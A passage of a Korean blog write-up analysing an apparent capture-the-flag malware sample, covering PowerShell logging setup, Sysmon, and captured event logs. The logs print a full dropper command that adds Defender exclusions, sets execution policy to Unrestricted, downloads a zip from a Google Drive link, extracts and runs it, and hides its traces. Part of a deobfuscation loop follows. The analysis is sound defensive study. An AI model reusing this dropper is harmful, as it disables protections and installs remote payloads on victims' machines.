      &lt;li&gt;이것도 생략. 파워쉘에서 실행되는 명령어가 난독화되었을 때 편하게 분석하는 방법을 찾기 위한 포스팅이기 때문&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그럼 위의 각 단계에서 나는 어떻게 난독화 이전의 쉘 스크립트를 얻을 수 있을까?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;23-쉘-스크립트-난독화-파훼&quot;&gt;2.3. 쉘 스크립트 난독화 파훼&lt;/h2&gt;

&lt;p&gt;앞서 나열한 경우수를 보았을 때, 쉘 스크립트를 악성 행위의 주요 기반으로 삼는 악성 프로그램은&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;파워쉘을 통해 쉘스크립트 실행&lt;/li&gt;
  &lt;li&gt;파워쉘을 통해 복호화 진행&lt;/li&gt;
  &lt;li&gt;파워쉘 등으로 이외 응용 다운로드&lt;/li&gt;
  &lt;li&gt;파워쉘로 이후 원격지 서버와 통신&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;등의 행위를 수행한다.&lt;/p&gt;

&lt;p&gt;즉 &lt;strong&gt;파워쉘에서 무엇이 어떻게 수행되는지 명확하게 알 수 있다면&lt;/strong&gt;, 쉘 스크립트 난독화를 파훼할 수 있다는 뜻이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;231-powershell-로깅-설정&quot;&gt;2.3.1. PowerShell 로깅 설정&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Windows PowerShell의 동작 로그는 윈도우 이벤트 로그 &amp;gt; 응용프로그램 및 서비스 로그 &amp;gt; Powershell에 기록된다.&lt;/li&gt;
  &lt;li&gt;그러나 추가 설정을 하지 않는 이상 가장 기본적인 정보만 제공한다는 문제가 있음&lt;/li&gt;
  &lt;li&gt;이를 보완하기 위해 분석용 PC에는 PowerShell 추가 로깅을 설정하는 게 좋음&lt;/li&gt;
  &lt;li&gt;PowerShell 추가 로깅 설정에는 아래의 옵션이 있음(출처: &lt;a href=&quot;https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.4&quot;&gt;MS 공식 홈페이지&lt;/a&gt;)
    &lt;ol&gt;
      &lt;li&gt;모듈 로깅
        &lt;ol&gt;
          &lt;li&gt;Record the pipeline execution events for members of specified modules. Module logging must be enabled for both the session and specific modules.&lt;/li&gt;
          &lt;li&gt;출력 일부 및 스크립트 일부 등을 기록함. 타 PowerShell 로깅 소스에서 누락된 일부 세부 정보를 놓치지 않기 위해 켜는 설정&lt;/li&gt;
          &lt;li&gt;이벤트 ID 4103&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;스크립트 블록 로깅
        &lt;ol&gt;
          &lt;li&gt;Record the processing of commands, script blocks, functions, and scripts whether invoked interactively, or through automation.&lt;/li&gt;
          &lt;li&gt;When you enable Script Block Logging, PowerShell records the content of all script blocks that it processes. Once enabled, any new PowerShell session logs this information.&lt;/li&gt;
          &lt;li&gt;즉, 실행된 코드의 전체 내용을 기록한다는 특징으로 인해 Decoded 된 코드 또한 기록됨&lt;/li&gt;
          &lt;li&gt;그러나, 실행된 코드의 출력을 기록하지 않음&lt;/li&gt;
          &lt;li&gt;이벤트 ID 4104&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;스크립트 실행
        &lt;ol&gt;
          &lt;li&gt;실행 허용 스크립트를 제어할 수 있음&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;PowerShell 기록
        &lt;ol&gt;
          &lt;li&gt;파워쉘의 IO를 모두 기록으로 남김&lt;/li&gt;
          &lt;li&gt;실행된 코드의 출력을 기록한다는 점에서 스크립트 블록 로깅과 함께 쓸 만함&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;Update-Help용 기본 경로 설정
        &lt;ol&gt;
          &lt;li&gt;파워쉘 최신 도움말 파일 다운로드 기본 경로를 설정할 수 있음&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;즉, ‘모듈 로깅’, ‘스크립트 블록 로깅’, ‘PowerShell 기록’ 3개 설정이 분석에 유용할 것으로 판단됨&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;추가로, 스크립트 실행 옵션을 켜주면 더 편하게 분석이 가능할 것 같음&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;232-powershell-로깅-설정-변경&quot;&gt;2.3.2. PowerShell 로깅 설정 변경&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;gpedit.msc라는 프로그램을 활용해 설정을 변경해줄 수도 있고&lt;/li&gt;
  &lt;li&gt;레지스트리 값을 변경해 원하는 설정을 적용할 수도 있고,&lt;/li&gt;
  &lt;li&gt;PowerShell conf file을 이용해 설정을 적용할 수도 있다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이 글에서는 gpedit.msc, 즉 Group Policy 응용을 활용해 설정을 변경해줄 것이다.&lt;/p&gt;

&lt;p&gt;이외 방법이 궁금하다면 &lt;a href=&quot;https://www.notion.so/250114_-_-_2-17bc244f77b480279aafcbe0575d2209?pvs=21&quot;&gt;여기&lt;/a&gt;로&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Windows 10, 11 home 버전에서는 gpedit.msc를 win+r로 검색해도 찾을 수 없을 것이다. 홈 에디션이라 그렇다.&lt;/p&gt;

&lt;p&gt;그럴 땐 아래의 배치를 분석 PC에서 관리자 권한으로 돌려주면 된다. 내부 커맨드를 보면 알겠지만 윈도우 패키지 프로그램으로 gpedit.msc를 설치하는 배치 파일이라 별다른 악성 행위는 하지 않는다. (보안하는 사람 특: 이런 거 보면 불안해서 뜯어봄)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/gpedit.bat&quot;&gt;gpedit.bat&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 win+r로 gpedit.msc를 실행하면 아래와 같은 창을 볼 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%204.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;컴퓨터 구성과 사용자 구성이 보인다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;둘의 하위 정책은 대부분 중복되지 않지만, 놀랍게도 이번에 수정할 파워쉘 정책은 중복된다.&lt;/p&gt;

&lt;p&gt;그럼 이 중 무엇을 선택해야 하나?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;결론: 컴퓨터 구성이 더 우선순위 높게 선택 적용된다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;컴퓨터 구성은 컴퓨터 부팅 시에, 사용자 구성은 사용자 로그인 시에 적용되기 때문이다.&lt;/p&gt;

&lt;p&gt;레지스트리 키 적용 시점 구분과 비슷한 걸 보니 레지스트리 키와 연관 있나 보다&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;는&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그렇네 생각해보니 여기에서 구성 변경하는 거랑 레지스트리 키 변경으로 구성 변경하는 거랑 똑같았지&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아무튼 다시 본론으로 돌아와서&lt;/p&gt;

&lt;p&gt;그렇다면 컴퓨터 구성에서 설정을 변경하는 편이 일 두 번 안 하고 좋을 것이다.&lt;/p&gt;

&lt;p&gt;gpedit.msc &amp;gt; 컴퓨터 구성 &amp;gt; 관리 템플릿 &amp;gt; Windows 구성 요소 &amp;gt; Windows PowerShell&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%205.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;여기에서 모듈 로깅, 스크립트 블록 로깅, PowerShell 기록 켜기를 True로 설정해줄 것이다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;모듈 로깅: 모듈 이름을 *로 명시해 줘야 모든 모듈의 활동이 기록될 것&lt;/li&gt;
  &lt;li&gt;PowerShell 기록: 기록 저장 디렉토리를 명시해주면 나중에 관리가 편할 것&lt;/li&gt;
  &lt;li&gt;스크립트 실행도 모든 스크립트에 대해 허용하도록 했다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 기본 설정이 완료되었다. 또한, 추가적으로 파일리스 악성코드의 활동을 분석하기 위해 필요한 방법을 소개한다.&lt;/p&gt;

&lt;p&gt;대체 언제 처음 소개했던 난독화된 쉘스크립트를 분석할 건지…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;233-sysmon을-활용한-백그라운드-동작-탐지&quot;&gt;2.3.3. Sysmon을 활용한 백그라운드 동작 탐지&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Sysmon은 Microsoft에서 배포하는 Sysinternals에 포함된 도구&lt;/li&gt;
  &lt;li&gt;Windows 로그에 기록되지 않거나 세부적으로 기록되지 않는 내용에 대해서 상세한 로그 기록을 위해 사용됨&lt;/li&gt;
  &lt;li&gt;윈도우 로그 경로에 Microsoft-Windows-Sysmon%4Operational.evtx 로그 파일이 생성되어 저장&lt;/li&gt;
  &lt;li&gt;그런데 기본 설정은 프로세스 생성 이벤트 수집만 하는 것이라, 특정 이벤트 및 해시를 포함한 로깅을 하고 싶다면 별도 설정 파일(xml)을 로드하여 실행해 줘야 한다.
    &lt;ul&gt;
      &lt;li&gt;모든 룰셋이 그렇듯 이것도 오픈 소스 룰셋이 있다. (https://github.com/SwiftOnSecurity/sysmon-config)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;설정만 제대로 한다면 백그라운드 동작도 캡쳐가 가능하다.
    &lt;ul&gt;
      &lt;li&gt;인젝션, 파일 생성, 레지스트리 조작 등…&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(출처: https://www.igloo.co.kr/security-information/powershell%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-%ED%8C%8C%EC%9D%BC%EB%A6%AC%EC%8A%A4-%EA%B3%B5%EA%B2%A9/)&lt;/p&gt;

&lt;p&gt;sysmon은 &lt;a href=&quot;https://learn.microsoft.com/ko-kr/sysinternals/downloads/sysmon&quot;&gt;ms 공식 홈페이지&lt;/a&gt;에서 다운로드할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-분석&quot;&gt;3. 분석&lt;/h1&gt;

&lt;p&gt;위 파워쉘 스크립트를 미리 문제 폴더에 powershell.ps1 파일로 저장해 두었다.&lt;/p&gt;

&lt;p&gt;이제 실행해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%206.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;800 파이프라인 실행 이벤트로 무언가 커맨드를 실행한 흔적이 남았다.&lt;/p&gt;

&lt;p&gt;상세 설명을 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;명령줄의 파이프라인 실행 세부 정보: Add-MpPreference -ExclusionPath &quot;C:\Windows\System32&quot;; $executionPolicyPath = &quot;HKLM:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell&quot;; $executionPolicyValue = &quot;Unrestricted&quot;; Set-ItemProperty -Path $executionPolicyPath -Name &quot;ExecutionPolicy&quot; -Value $executionPolicyValue; Add-Type -AssemblyName System.IO.Compression.FileSystem; function Test-InternetConnection { try { $request = [System.Net.WebRequest]::Create(&quot;http://www.google.com&quot;); $request.Timeout = 10000; $request.Method = &quot;HEAD&quot;; $response = $request.GetResponse(); $response.Close(); return $true } catch { return $false } }; function Create-BaseDirectory { $directoryPath = &quot;C:\Program Files\Microsoft Mail&quot;; if (!(Test-Path -Path $directoryPath)) { New-Item -Force -ItemType directory -Path $directoryPath; Write-Output &quot;[+] Base Directory Created&quot; } else { Write-Output &quot;[!] Base Directory Already Exists&quot; }; Add-MpPreference -ExclusionPath &quot;C:\Program Files\Microsoft Mail&quot; }; function Download-File { $url1 = &quot;https://www.7-zip.org/a/7z2401-x64.exe&quot;; $dest1 = &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; $url2 = &quot;https://drive.usercontent.google.com/u/0/uc?id=1OvkcHZnQd91akAGdaQLNWU_HxjNvv9Hl&amp;amp;export=download&quot;; $dest2 = &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; $client = New-Object System.net.webclient; $client.DownloadFile($url1, $dest1); $client.DownloadFile($url2, $dest2); Write-Output &quot;[+] Success Download&quot; }; function PWUnzip { $install7z = &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; $zipFilePath = &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; $7zipPath = &quot;C:\Program Files\7-Zip\7z.exe&quot;; Start-Process $install7z /S -Wait -PassThru; &amp;amp; $7zipPath x $zipFilePath -y; mv rc &quot;C:\Program Files\Microsoft Mail\&quot; }; function Hide-Action { Remove-Item -Path &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; Remove-Item -Path &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; Remove-Item -Path &quot;C:\Users\torden\Downloads\mail helper.zip&quot;; Remove-Item -Recurse -Path &quot;C:\Users\torden\Downloads\mail helper&quot;; $End_Task = Get-Item &quot;C:\Program Files\Microsoft Mail\&quot; -Force; $End_Task.Attributes = &quot;Hidden&quot;; Write-Output &quot;[+] Success Hidden_Action&quot; }; Create-BaseDirectory; if (Test-InternetConnection) { Download-File; PWUnzip; Hide-Action }; cd &quot;C:\Program Files\Microsoft Mail\rc&quot;; &amp;amp; &quot;.\system.ps1&quot;                . 

컨텍스트 정보: 
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=19

	UserId=DESKTOP-UAR1ODI\horim
	HostName=ConsoleHost
	HostVersion=5.1.19041.5369
	HostId=a5338884-9dff-4c76-958e-23188077e040
	HostApplication=powershell
	EngineVersion=5.1.19041.5369
	RunspaceId=511f0e7c-7646-4dcd-8b44-b99961f93057
	PipelineId=20
	ScriptName=
	CommandLine=Add-MpPreference -ExclusionPath &quot;C:\Windows\System32&quot;; $executionPolicyPath = &quot;HKLM:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell&quot;; $executionPolicyValue = &quot;Unrestricted&quot;; Set-ItemProperty -Path $executionPolicyPath -Name &quot;ExecutionPolicy&quot; -Value $executionPolicyValue; Add-Type -AssemblyName System.IO.Compression.FileSystem; function Test-InternetConnection { try { $request = [System.Net.WebRequest]::Create(&quot;http://www.google.com&quot;); $request.Timeout = 10000; $request.Method = &quot;HEAD&quot;; $response = $request.GetResponse(); $response.Close(); return $true } catch { return $false } }; function Create-BaseDirectory { $directoryPath = &quot;C:\Program Files\Microsoft Mail&quot;; if (!(Test-Path -Path $directoryPath)) { New-Item -Force -ItemType directory -Path $directoryPath; Write-Output &quot;[+] Base Directory Created&quot; } else { Write-Output &quot;[!] Base Directory Already Exists&quot; }; Add-MpPreference -ExclusionPath &quot;C:\Program Files\Microsoft Mail&quot; }; function Download-File { $url1 = &quot;https://www.7-zip.org/a/7z2401-x64.exe&quot;; $dest1 = &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; $url2 = &quot;https://drive.usercontent.google.com/u/0/uc?id=1OvkcHZnQd91akAGdaQLNWU_HxjNvv9Hl&amp;amp;export=download&quot;; $dest2 = &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; $client = New-Object System.net.webclient; $client.DownloadFile($url1, $dest1); $client.DownloadFile($url2, $dest2); Write-Output &quot;[+] Success Download&quot; }; function PWUnzip { $install7z = &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; $zipFilePath = &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; $7zipPath = &quot;C:\Program Files\7-Zip\7z.exe&quot;; Start-Process $install7z /S -Wait -PassThru; &amp;amp; $7zipPath x $zipFilePath -y; mv rc &quot;C:\Program Files\Microsoft Mail\&quot; }; function Hide-Action { Remove-Item -Path &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; Remove-Item -Path &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; Remove-Item -Path &quot;C:\Users\torden\Downloads\mail helper.zip&quot;; Remove-Item -Recurse -Path &quot;C:\Users\torden\Downloads\mail helper&quot;; $End_Task = Get-Item &quot;C:\Program Files\Microsoft Mail\&quot; -Force; $End_Task.Attributes = &quot;Hidden&quot;; Write-Output &quot;[+] Success Hidden_Action&quot; }; Create-BaseDirectory; if (Test-InternetConnection) { Download-File; PWUnzip; Hide-Action }; cd &quot;C:\Program Files\Microsoft Mail\rc&quot;; &amp;amp; &quot;.\system.ps1&quot;                 

세부 정보: 
CommandInvocation(Add-Type): &quot;Add-Type&quot;
매개 변수 바인딩(Add-Type): 이름=&quot;AssemblyName&quot;; 값=&quot;System.IO.Compression.FileSystem&quot;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;HostApplication=Powershell인 것으로 보아, 내가 실행한 powershell.ps1 스크립트에서 새로운 PowerShell을 띄우고 그 인자로(pipe를 통해 전달) CommandLine을 전달한 것 같다.&lt;/p&gt;

&lt;p&gt;즉, 내가 실행한 스크립트는 위의 CommandLine을 디코딩해 실행하는 스크립트이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그러나 완전 빅 프라블럼&lt;/p&gt;

&lt;p&gt;나는 powershell.ps1의 난독화를 해제하고 싶은 건데……. 스스로를 복호화해 실행하는 그런 건 아닌 것 같다….&lt;/p&gt;

&lt;p&gt;수제로 난독화를 해제하기로 했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$var10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Guide.dib&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$guide_path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Join-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$guide_fileData&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.IO.File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$guide_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decoded_data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Collections.ArrayList&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18304&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-bor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$guide_fileData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decoded_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

